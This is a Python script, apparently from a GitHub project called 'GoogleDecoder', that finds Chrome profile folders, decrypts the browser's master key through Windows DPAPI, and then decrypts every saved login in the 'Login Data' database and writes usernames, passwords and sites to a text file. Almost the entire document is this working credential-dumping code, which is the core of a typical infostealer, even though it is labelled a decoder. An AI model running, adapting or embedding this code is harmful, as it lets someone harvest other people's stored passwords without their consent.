#!/usr/bin/python
# -*- coding: utf-8 -*-
from time import sleep
import os
from Crypto.Cipher import AES
from shutil import copy2
import json
from base64 import b64decode
from win32crypt import CryptUnprotectData
import sqlite3
import sys
print(' ╔═════════════════════════════════════════════════════╗\n ║  Login Database Passwords Decoder                   ║\n ║  This Script Can Decode A Login Database            ║\n ║  Author : VirusNoir                                 ║\n ║  Script : github.com/VirusNoirrr/GoogleDecoder  ║\n ╚═════════════════════════════════════════════════════╝\n')

local = os.getenv("LOCALAPPDATA") 
google_paths = [
            local + '\\Google\\Chrome\\User Data\\Default',
            local + '\\Google\\Chrome\\User Data\\Profile 1',
            local + '\\Google\\Chrome\\User Data\\Profile 2',
            local + '\\Google\\Chrome\\User Data\\Profile 3',
            local + '\\Google\\Chrome\\User Data\\Profile 4',
            local + '\\Google\\Chrome\\User Data\\Profile 5',
        ]
def get_masterkey():
        print("[*] Getting The Masterkey")
        with open(local + '\\Google\\Chrome\\User Data\\Local State', "r", encoding="utf-8") as f:
            local_state = f.read()
        local_state = json.loads(local_state)
        print("[*] Decoding The Masterkey")
        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        print(f"[+] Masterkey is {master_key}")
        return master_key
masterkey = get_masterkey()
def decode_password(buffer, master_key):
        try:
            bufiv, payload = buffer[3:15], buffer[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, bufiv)
            decoded = cipher.decrypt(payload)[:-16].decode()
            return decoded
        except:
            return "Not Fount"
def passwords():
            print("[*] Getting The Passwords To Decode Them !")
            with open(f"Passwords.txt", "w", encoding="utf-8") as f:
                f.write("Saved Login Vault Passwords Backup (github.com/VirusNoirrr/LoginVaultDecoder)\n\n")
            print("[*] Checking The Where Is The Login Vault !")
            for path in google_paths:
                path += '\\Login Data'
                if os.path.exists(path):
                    print(f"[*] A Login Vault Has Been Fount ! : {path}")
                    copy2(path, local+"\\vault.db")
                    print("[*] Connecting To The Vault !")
                    db = sqlite3.connect(local+"\\vault.db")
                    cmd = db.cursor()
                    print("[*] Saving The Passwords !")
                    with open(f"Passwords.txt", "a", encoding="utf-8") as f:
                        print("[*] Decoding The Passwords !")
                        for result in cmd.execute("SELECT action_url, username_value, password_value FROM logins"):
                            url, username, password = result
                            password = decode_password(password, masterkey)
                            if url and username and password != "":
                                f.write(
                                    "Username: {:<30} | Password: {:<30} | Site: {:<30}\n".format(
                                        username, password, url))
                        print("[+] All The Passwords Has Been Decoded !")
                    print("[+] Passwords Saved As : Passwords.txt")
                    sleep(1)
                    cmd.close()
                    

                    db.close()
                    os.remove(local+"\\vault.db")
try:
    if sys.argv[1]:
        print(' ╔═════════════════════════════════════════════════════╗\n ║  Login Database Passwords Decoder                   ║\n ║  This Script Can Decode A Login Database            ║\n ║  Author : VirusNoir                                 ║\n ║  Script : github.com/VirusNoirrr/GoogleDecoder  ║\n ╚═════════════════════════════════════════════════════╝\n')
        def argv_passwords():
                print("[*] Getting The Passwords To Decode Them !")
                with open(f"Passwords.txt", "w", encoding="utf-8") as f:
                    f.write("Saved Login Vault Passwords Backup (github.com/VirusNoirrr/LoginVaultDecoder)\n\n")
                path = sys.argv[1]
                if os.path.exists(path):
                    db = sqlite3.connect(path)
                    cmd = db.cursor()
                    with open(f"Passwords.txt", "a", encoding="utf-8") as f:
                        for result in cmd.execute("SELECT action_url, username_value, password_value FROM logins"):
                                    url, username, password = result
                                    password = decode_password(
                                        password, masterkey)
                                    if url and username and password != "":
                                        f.write(
                                            "Username: {:<30} | Password: {:<30} | Site: {:<30}\n".format(
                                                username, password, url))
                    cmd.close()
                    db.close()
                
                else:
                    print("Database File Doesnt Exist !")
        argv_passwords()
    if sys.argv[1] == "-h" or "--help":
        print(' ╔═════════════════════════════════════════════════════╗\n ║  Login Database Passwords Decoder                   ║\n ║  This Script Can Decode A Login Database            ║\n ║  Author : VirusNoir                                 ║\n ║  Script : github.com/VirusNoirrr/GoogleDecoder  ║\n ╚═════════════════════════════════════════════════════╝\n')
        print(f"Usage: py {sys.argv[0]} <Login Database Path>")
        print("You Can Just Run The Script It Will Do This Automaticly !")
        print("If It Says The Database Is Locked, Copy It To Another Path Then Try The Script On That Path !")
except IndexError:
    passwords()